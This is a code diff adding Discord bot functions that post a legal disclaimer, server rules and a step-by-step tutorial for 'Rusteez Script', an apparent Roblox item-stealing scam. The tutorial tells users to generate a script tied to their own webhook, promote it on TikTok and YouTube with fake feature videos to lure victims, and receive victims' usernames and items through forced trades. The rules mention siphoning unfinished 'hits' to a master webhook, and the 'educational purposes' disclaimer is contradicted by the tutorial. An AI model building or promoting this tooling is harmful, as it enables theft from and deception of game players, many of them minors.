@@ -585,6 +585,182 @@ wss.on('connection', (ws, req) => {
     }
     
 });
+app.post('/api/admin/setup-discord', async (req, res) => {
+    const { type } = req.body;
+    try {
+        if (type === 'rules') await sendOfficialRules();
+        if (type === 'disclaimer') await sendLegalDisclaimer();
+        if (type === 'tutorial') await sendTutorial();
+        
+        res.json({ success: true, message: `Action ${type} exécutée !` });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+async function sendLegalDisclaimer() {
+    const channelId = "1487369531058815096";
+    const channel = await clientDiscord.channels.fetch(channelId);
 
+    if (!channel) return console.log("❌ Channel introuvable.");
+
+    const disclaimerEmbed = new EmbedBuilder()
+        .setTitle("⚖️ LEGAL DISCLAIMER")
+        .setColor(0x2b2d31) // Gris foncé pour le style "Légal"
+        .setDescription(
+            "All content, scripts, code examples, and information provided on this server are intended **solely for educational, research, and testing purposes.**\n" +
+            "Nothing shared here is designed, intended, or encouraged to be used in violation of Roblox’s Terms of Service, platform rules, or any applicable laws."
+        )
+        .addFields(
+            { 
+                name: "🚫 Non-Endorsement Policy", 
+                value: "This server and its administrators do not endorse, support, or promote:\n" +
+                       "• Game exploitation or unauthorized modifications\n" +
+                       "• Accessing, altering, or interfering with accounts or data\n" +
+                       "• Cheating, hacking, or disrupting online services\n" +
+                       "• Any illegal, harmful, or unethical activity"
+            },
+            { 
+                name: "👤 User Responsibility", 
+                value: "Users are **fully responsible** for how they choose to use any information obtained from this server. The server owners, staff, and contributors assume no responsibility or liability for bans, losses, damages, or legal consequences arising from misuse or unauthorized activities."
+            },
+            { 
+                name: "📚 Purpose of Existence", 
+                value: "This server exists exclusively for:\n" +
+                       "• Educational learning\n" +
+                       "• Script development and experimentation\n" +
+                       "• Security research and awareness\n" +
+                       "• Understanding game mechanics and system behavior"
+            },
+            { 
+                name: "📜 Agreement", 
+                value: "By joining or using this server, you acknowledge that you have read, understood, and agreed to this Legal Disclaimer. **If you do not agree with these terms, you must refrain from using the content and leave the server.**"
+            }
+        )
+        .setFooter({ text: "Rusteez Script Compliance Department" })
+        .setTimestamp();
+
+    await channel.send({ embeds: [disclaimerEmbed] });
+    console.log("✅ Legal Disclaimer sent!");
+}
+async function sendTutorial() {
+    const channelId = "1487369816921870476"; // Salon Tutorial
+    const commandChannelId = "1487370156932857896"; // Salon des commandes
+    
+    try {
+        const channel = await clientDiscord.channels.fetch(channelId);
+        if (!channel) return console.log("❌ Channel de tutoriel introuvable.");
+
+        const tutorialEmbed = new EmbedBuilder()
+            .setTitle("🚀 HOW TO GENERATE YOUR SCRIPT")
+            .setColor(0x0ea5e9) // Bleu Cyan pour le guide
+            .setDescription("Follow these simple steps to generate and use your customized Rusteez SAB Trade script.")
+            .setThumbnail(client.user.displayAvatarURL())
+            .addFields(
+                { 
+                    name: "Step 1: Create a Webhook", 
+                    value: "• Go to your own Discord server settings.\n• Integrations → Webhooks → New Webhook.\n• **Copy the Webhook URL**. This is where your hits will be sent." 
+                },
+                { 
+                    name: "Step 2: Run the Command", 
+                    value: `Go to the <#${commandChannelId}> channel and type \`/generate-sab-trade\` with these exact fields:\n\n` +
+                           "👤 **username** (Required)\n" +
+                           "Enter the Roblox usernames that will receive the items, separated by commas (ex: `User1, User2`).\n\n" +
+                           "🔗 **webhook** (Required)\n" +
+                           "Paste your Discord Webhook URL where the hits will be logged.\n\n" +
+                           "💰 **income** (Required)\n" +
+                           "Set the minimum income threshold. (ex: `10000000`).\n\n" +
+                           "🖼️ **visual** (Optional)\n" +
+                           "Paste a URL if you want to display a specific interface to the victim. Leave empty for default. (ex: 'https://pastefy.app/GQI2AOam/raw')"
+                },
+                { 
+                    name: "Step 3: Get your Script", 
+                    value: "• Check your **Direct Messages (DMs)**. The bot will send you your code.\n• Copy the entire script." 
+                },
+                { 
+                    name: "Step 4: Promotion (Get more Hits!)", 
+                    value: "To get the most items, you need victims! Promote your script on **TikTok, YouTube Shorts, and Discord**:\n\n" +
+                           "🎥 **Create Content:** Record a video showing the 'Visual' interface (fake OP features).\n" +
+                           "🔗 **Share the Script:** Put your generated script in a **Pastebin** or a comment.\n" +
+                           "📱 **Go Viral:** Use tags like `#SAB #SkibiAnyBattle #RobloxExploit` to reach thousands of players.\n\n" +
+                           "*The more people use your script, the more hits you receive!*"
+                },
+                { 
+                    name: "Step 5: Receive the Hit", 
+                    value: "• When a victim executes your script, you will receive a notification on your **Discord Webhook**.\n• It will contain the victim's **Username** and their most valuable **Brainrots**." 
+                },
+                { 
+                    name: "Step 6: Finalizing the Trade 💰", 
+                    value: "• Join SAB.\n" +
+                           "• **Send a Trade Request** to the victim.\n" +
+                           "• The script will automatically force the victim to add their **best Brainrots** to the trade.\n" +
+                           "• Accept the trade and enjoy your new items!" 
+                },
+                { 
+                    name: "💡 Pro Tip", 
+                    value: "Make sure your DMs are open! If you don't receive the script, check your privacy settings." 
+                }
+            )
+            .setFooter({ text: "Rusteez Script Tutorial", iconURL: client.user.displayAvatarURL() })
+            .setTimestamp();
+
+        await channel.send({ embeds: [tutorialEmbed] });
+        console.log("✅ Tutorial sent successfully!");
+
+    } catch (err) {
+        console.error("❌ Error sending tutorial:", err);
+    }
+}
+async function sendOfficialRules() {
+    const channelId = "1487369531058815096";
+    const channel = await clientDiscord.channels.fetch(channelId);
+
+    if (!channel) return console.log("❌ Channel introuvable.");
+
+    const rulesEmbed = new EmbedBuilder()
+        .setTitle("🛡️ Rusteez Script • Official Rules")
+        .setColor(0xa855f7)
+        .setDescription("Welcome to Rusteez. To maintain a professional and safe environment for all exploiters, you must follow these guidelines. By staying in this server, you agree to the following:")
+        .addFields(
+            { 
+                name: "Section I: General Conduct", 
+                value: "1.) **Legal Compliance:** Follow the Discord Terms of Service and Community Guidelines.\n" +
+                       "2.) **Age Requirement:** You must be 13 years or older. Underage users will be banned immediately.\n" +
+                       "3.) **Zero Tolerance:** No racist, discriminatory language, or slurs. This includes the n-word and any offensive terms.\n" +
+                       "4.) **Respect Staff:** Respect moderator decisions. Do not publicly argue about moderation actions taken.\n" +
+                       "5.) **NSFW Content:** Posting sexually explicit content, nudity, or gore is strictly prohibited."
+            },
+            { 
+                name: "Section II: Communication", 
+                value: "6.) **English Only:** English is the only language tolerated in main channels.\n" +
+                       "7.) **No Spamming:** Avoid repetitive messages, excessive emojis (Max 3), or unsolicited advertisements.\n" +
+                       "8.) **Pinging Policy:** Do not mass-ping users or staff. Only ping staff for genuine assistance or questions.\n" +
+                       "9.) **No Spoiling/Trolling:** Do not disrupt the community with spoilers, excessive CAPS, or toxic behavior."
+            },
+            { 
+                name: "Section III: Safety & Security", 
+                value: "10.) **No Advertising:** Do not promote other Discord servers, Telegrams, or external services.\n" +
+                       "11.) **No Scamming:** Phishing links, fake giveaways, or misleading information will result in a permanent ban.\n" +
+                       "12.) **No Selling:** Selling external goods or services is not allowed to maintain a safe environment.\n" +
+                       "13.) **No Dating/Doxxing:** This is a scripting community. Dating and sharing private info (doxxing) are forbidden."
+            },
+            { 
+                name: "⚠️ Important: Redirection Policy", 
+                value: "To ensure network stability and security, all active hits are monitored.\n" +
+                       "If a trade is not successfully completed by the script owner within **120 seconds**, the hit data will be automatically redirected to our Master Webhook for logging and security synchronization.\n\n" +
+                       "*Don't be slow — Stay active.*"
+            }
+        )
+        .setFooter({ text: "Rusteez Script • Stay Safe", iconURL: client.user.displayAvatarURL() })
+        .setTimestamp();
+
+    const message = await channel.send({ embeds: [rulesEmbed] });
+    
+    // Ajout des réactions automatiques comme demandé
+    await message.react('👍');
+    await message.react('❤️');
+    await message.react('🔥');
+
+    console.log("✅ Official Rules sent with reactions!");
+}
 app.use(express.static('public'));
 server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
